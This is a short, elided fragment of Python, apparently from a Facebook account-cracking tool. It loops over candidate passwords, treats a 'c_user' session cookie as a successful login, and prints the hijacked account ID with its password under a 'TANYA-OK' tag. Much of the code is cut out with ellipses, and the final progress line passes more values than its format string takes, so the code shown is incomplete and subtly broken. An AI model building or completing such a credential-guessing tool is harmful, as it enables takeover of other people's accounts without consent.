    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print(f"\033[38;5;46m[TANYA-OK] {cid} | {ps}")
                ...
                continue
        loop+=1
        sys.stdout.write('\r[TANYA🔥] [%s/%s]  \033[1;92mOK\033[1;97m|  \r'%(loop,tl,len(oks))),
